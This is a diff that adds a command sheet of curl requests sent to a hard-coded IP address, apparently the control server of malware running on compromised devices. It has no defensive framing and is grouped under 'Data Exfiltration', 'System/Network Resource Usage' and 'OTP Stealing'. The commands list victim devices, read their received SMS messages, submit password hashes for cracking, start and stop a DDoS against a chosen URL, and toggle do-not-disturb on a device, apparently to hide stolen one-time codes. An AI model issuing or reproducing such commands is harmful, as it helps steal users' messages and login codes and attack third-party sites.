@@ -1,0 +1,38 @@
+============ Data Exfiltration +==========
+
+curl.exe -X POST "http://20.228.247.250:8000/list_devices" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/save_state" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/load_state" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/list_received_sms" -H "Content-Type: application/json" -d '{\"password\": \"!@#$QWER\"}'
+
+
+
+===== System/Network Resource Usage ======
+
+curl.exe -X POST "http://20.228.247.250:8000/submit_hash" -H "Content-Type: application/json" -d '{\"hash\": \"f029f5c2d8fc9742c97458f6083c45585f3d010cc258d731b03593077cd5f717\", \"password\": \"!@#$QWER\"}'
+
+curl.exe -X POST "http://20.228.247.250:8000/submit_salt_and_hash" -H "Content-Type: application/json" -d '{\"salt\": \"65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\", \"salted_hash\": \"37aa4c4d546adb02615b6e867cd5afe399437edc300dff07fc8f0a94a502ed51\", \"password\": \"!@#$QWER\"}'
+
+curl.exe -X POST "http://20.228.247.250:8000/trigger_ddos" -H "Content-Type: application/json" -d '{\"url\": \"http://example.com\", \"password\": \"!@#$QWER\"}'
+
+curl.exe -X POST "http://20.228.247.250:8000/stop_ddos" -H "Content-Type: application/json" -d '{\"password\": \"!@#$QWER\"}'
+
+
+
+===== OTP Stealing ======
+
+curl.exe -X POST "http://20.228.247.250:8000/dnd_on" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/dnd_off" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/query_power" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+curl.exe -X POST "http://20.228.247.250:8000/list_ssid_uuid_mappings" -H "Content-Type: text/plain" -d '!@#$QWER'
+
+ curl.exe -X POST "http://20.228.247.250:8000/send_event_unicast" -H "Content-Type: application/json" -d '{\"password\": \"!@#$QWER\", \"event\": \"dndOff\", \"uuid\": \"a08cf216-7c6d-418e-9d70-78da2ac31965\"}'
+
+curl.exe -X POST "http://20.228.247.250:8000/send_event_unicast" -H "Content-Type: application/json" -d '{\"password\": \"!@#$QWER\", \"event\": \"dndOn\", \"uuid\": \"a08cf216-7c6d-418e-9d70-78da2ac31965\"}'
+
